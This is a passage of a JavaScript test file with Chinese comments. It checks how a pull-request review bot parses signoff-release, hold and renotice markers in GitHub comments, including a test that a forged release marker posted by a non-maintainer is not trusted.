  check(m.get('security')?.by === 'magiclizi', '放行人可溯源');
  check(!m.has('coldUpdate') && !m.has('arch'), '未放行的 kind 不出现');

  // 普通评论 / hold 标记不会被误解析
  const none = parseSignoffReleases([
    at('随便聊聊 gates=security', '2026-07-28T01:00:00Z'),
    at('<!-- review-pr:product-gate issue=https://github.com/o/r/issues/9 -->', '2026-07-28T01:30:00Z'),
  ]);
  check(none.size === 0, '普通评论与 hold 标记不构成放行');

  // 先按评论作者 + 最终维护者集合验证，再按 kind 归并；后来的伪造 marker 不能遮住可信 marker。
  const events = parseSignoffReleaseEvents([
    { body: '<!-- review-pr:signoff-release gates=security by=magiclizi -->', createdAt: '2026-07-28T01:00:00Z', author: { login: 'magiclizi' } },
    { body: '<!-- review-pr:signoff-release gates=security by=magiclizi -->', createdAt: '2026-07-28T02:00:00Z', author: { login: 'attacker' } },
    { body: '<!-- review-pr:signoff-release gates=rules by=former -->', createdAt: '2026-07-28T03:00:00Z', author: { login: 'former' } },
  ]);
  const selected = selectTrustedSignoffReleases(events, ['magiclizi']);
  check(selected.trusted.get('security')?.commentAuthor === 'magiclizi', '伪造 marker 不遮住较早的可信 release');
  check(!selected.trusted.has('rules'), '已离开最终维护者集合的 marker 不放行');
  check(selected.untrusted.length === 2, '伪造 / 旧成员 marker 都保留为诊断材料');
}

section('hold 标记解析(取最后一条,兼容旧 kind=arch 形态)');
{
  const at = (s, t) => ({ body: s, createdAt: t });
  const h = parseLastHoldMarker([
    at('第一次 hold\n<!-- review-pr:product-gate issue=https://github.com/o/r/issues/88 -->', '2026-07-27T10:00:00Z'),
    at('第二次 hold\n<!-- review-pr:product-gate kind=arch issue=https://github.com/o/r/issues/99 -->', '2026-07-27T17:41:31Z'),
  ]);
  check(h?.issueNumber === 99 && h?.kind === 'arch', `取最后一条 hold 标记 -> issue#${h?.issueNumber}`);
  check(h?.heldAt === '2026-07-27T17:41:31Z', 'heldAt 是最后一条 hold 标记评论的时间');
  check(parseLastHoldMarker([at('普通评论', '2026-07-27T10:00:00Z')]) === null, '无标记返回 null');
}

// 状态回帖的去重口径。守的是两头:漏发 → 作者以为卡死了(#1283 白等 6 小时);
// 重复发 → 作者一轮推 5 次收 5 条,提醒变刷屏、最后被当噪音忽略。
section('状态回帖标记解析(按 head sha 去重)');
{
  const HEAD = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0';
  const OTHER = '0f9e8d7c6b5a40392817263544536271809a0b1c';
  const noticed = parseSignoffRenotices([
    { body: '普通评论' },
    { body: `@a 你的新提交已经收到\n\n<!-- review-pr:signoff-renotice head=${HEAD} -->` },
  ]);
  check(noticed.has(HEAD), '同一版代码已回帖 → 不再重复回帖');
  check(!noticed.has(OTHER), '作者推了新代码(head 变了)→ 门再亮起来时会重新回帖');
  check(parseSignoffRenotices([{ body: '什么标记都没有' }]).size === 0, '无标记 → 空集合');
  // 写入侧(signoff-hold.mjs 用常量拼)与读取侧(本文件的正则)必须对得上:
  // 常量被改而正则没跟,后果是**每轮都重复回帖**,而且不会有任何报错。
  check(
    parseSignoffRenotices([{ body: `${SIGNOFF_RENOTICE_MARKER_PREFIX} head=${HEAD} -->` }]).has(HEAD),
    '按常量拼出的标记能被解析回来(写入/读取口径不漂移)',
  );
  // 大小写归一:GitHub 各接口给的 sha 大小写不保证一致,大写标记必须命中小写 headRefOid
  check(
    parseSignoffRenotices([{ body: `<!-- review-pr:signoff-renotice head=${HEAD.toUpperCase()} -->` }]).has(HEAD),
    'sha 大小写不影响去重',
  );
  // 别把 hold / 通过标记误当成回帖(三种标记同在一条 PR 里)
  check(
    parseSignoffRenotices([
      { body: '<!-- review-pr:product-gate issue=https://github.com/o/r/issues/9 -->' },
      { body: '<!-- review-pr:signoff-release gates=security by=magiclizi -->' },
    ]).size === 0,
    'hold / 通过标记不构成回帖记录',
  );
}

console.log(`\n${failed === 0 ? 'ALL PASS' : `${failed} FAILED`} (${passed} passed)`);
process.exit(failed === 0 ? 0 : 1);
